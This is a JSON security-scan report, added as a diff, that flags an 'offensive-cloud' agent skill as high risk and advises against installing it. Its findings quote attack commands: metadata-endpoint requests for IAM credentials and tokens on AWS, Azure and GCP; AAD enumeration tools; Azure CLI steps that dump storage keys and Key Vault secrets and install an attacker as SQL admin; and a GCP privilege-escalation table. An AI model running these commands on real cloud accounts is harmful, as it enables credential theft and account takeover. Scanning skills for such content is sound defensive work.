@@ -1,0 +1,806 @@
+{
+  "multi_skill": true,
+  "skill_count": 1,
+  "max_risk_score": 56,
+  "risk_severity": "HIGH",
+  "execution_successful": true,
+  "risk_recommendation": "DO_NOT_INSTALL",
+  "analysis_completeness": {
+    "is_complete": true,
+    "execution_successful": true,
+    "status": "complete",
+    "coverage_percent": 100.0,
+    "fully_inspected_files": 1,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "total_files": 1,
+    "limitations": [],
+    "scope": "recursive_skills"
+  },
+  "skills_scanned": 1,
+  "skills_omitted": 0,
+  "skills_output_omitted": 0,
+  "public_finding_records": 5,
+  "report_characters": 25954,
+  "transitive_finding_count": 0,
+  "transitive_sources": [],
+  "skills": [
+    {
+      "name": "offensive-cloud",
+      "path": "offensive-cloud",
+      "risk_score": 56,
+      "risk_severity": "HIGH",
+      "finding_count": 3,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-cloud",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/cloud/offensive-cloud",
+        "scanned_at": "2026-11-13T11:38:13.476429+00:00"
+      },
+      "risk_assessment": {
+        "score": 56,
+        "severity": "HIGH",
+        "recommendation": "DO_NOT_INSTALL",
+        "max_issue_severity": "HIGH"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 346,
+          "executable": false,
+          "size_bytes": 12641,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-f775a26e38b6480cadae6a275c1a5b58",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 34,
+            "end_line": null,
+            "start_column": 12
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "\n```bash\n# IMDSv1 (legacy)\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n\n# IMDSv2 (modern, requires token)\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" \\",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 34,
+              "end_line": null,
+              "start_column": 12
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-39c2db31f0354825acf5bcba2e1b3a3a",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 37,
+            "end_line": null,
+            "start_column": 28
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\n\n# IMDSv2 (modern, requires token)\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" \\\n  -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 37,
+              "end_line": null,
+              "start_column": 28
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-5ff197f4bfa2442989c03038d919b546",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 138,
+            "end_line": null,
+            "start_column": 10
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "\n```bash\ncurl -H \"Metadata:true\" \\\n  \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F\"\n```\n\n### Privilege Escalation Paths",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 138,
+              "end_line": null,
+              "start_column": 10
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-b281897d83f44c5cb58cd7a5e2579d24",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'offensive_tool_references': References to well-known offensive security tools [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 162,
+            "end_line": null
+          },
+          "finding": "BloodHound; BloodHound",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": "ator` | Same minus on-prem | Cloud admin |\n| AAD `Directory Synchronization Account` | DCSync via AAD Connect | All on-prem hashes |\n| Privileged Authentication Administrator | Reset MFA / passwords for Globals | Global Admin reset |\n\n```bash\n# ROADtools \u2014 the AAD enumeration toolkit\nroadrecon auth -u user@tenant -p pass\nroadrecon gather\nroadrecon gui  # browse the gathered DB\n\n# AzureHound for BloodHound integration\nazurehound list -u user -p pass --tenant tenant.onmicrosoft.com\n```\n\n### Data Targets\n\n```bash\n# Storage account access keys (gold)\naz storage account keys list -g RG -n SA\n\n# Key Vault (per RBAC + access policies)\naz keyvault secret list --vault-name myvault\naz keyvault secret show --vault-name myvault -n cred\n\n# Cosmos DB primary keys\naz cosmosdb keys list -g RG -n acct\n\n# SQL admin reset\naz sql server ad-admin create -g RG -s server -u attacker@tenant -i <obj-id>\n```\n\n### Persistence\n\n```bash\n# Add cert to existing privileged AAD application\naz ad app credential reset",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5d11af9965b410667e887582c0181388e8d2b296ed99a6ae4ca89aceb370ac8f",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 162,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-32418bec8c4748d8a2a222ac7af5d542",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 216,
+            "end_line": null,
+            "start_column": 9
+          },
+          "finding": "metadata.google.internal",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "\n```bash\ncurl -H \"Metadata-Flavor: Google\" \\\n  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n```\n\n### Privilege Escalation Paths",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "628815e490cc42c38af4f44f4927d10f2a63a73dfe75c8399825a110c480b04c",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 216,
+              "end_line": null,
+              "start_column": 9
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 224,
+            "end_line": 224,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 226,
+            "end_line": 226,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 227,
+            "end_line": 227,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 228,
+            "end_line": 228,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 229,
+            "end_line": 229,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 230,
+            "end_line": 230,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 231,
+            "end_line": 231,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 224,
+            "column": 31,
+            "evidence": "| `iam.serviceAccountUser` + `compute.instances.create` | Pass SA to new VM | Run as SA via IMDS |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 226,
+            "column": 4,
+            "evidence": "| `cloudbuild.builds.create` | Build runs as Cloud Build SA (often Editor) | Editor on project |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 227,
+            "column": 4,
+            "evidence": "| `deploymentmanager.deployments.create` | Runs as DM SA (often Owner) | Owner |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 228,
+            "column": 4,
+            "evidence": "| `cloudfunctions.functions.create` + actAs | Pass any SA to function | Run as that SA |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 229,
+            "column": 4,
+            "evidence": "| `dataflow.jobs.create` + actAs | Same pattern | SA's perms |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 230,
+            "column": 4,
+            "evidence": "| `iam.roles.update` (custom roles) | Add permissions to a role you have | Self-elevate |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 231,
+            "column": 4,
+            "evidence": "| `resourcemanager.projects.setIamPolicy` | Grant self any role | Owner |",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 5,
+        "findings_after_filtering": 5,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    }
+  ]
+}
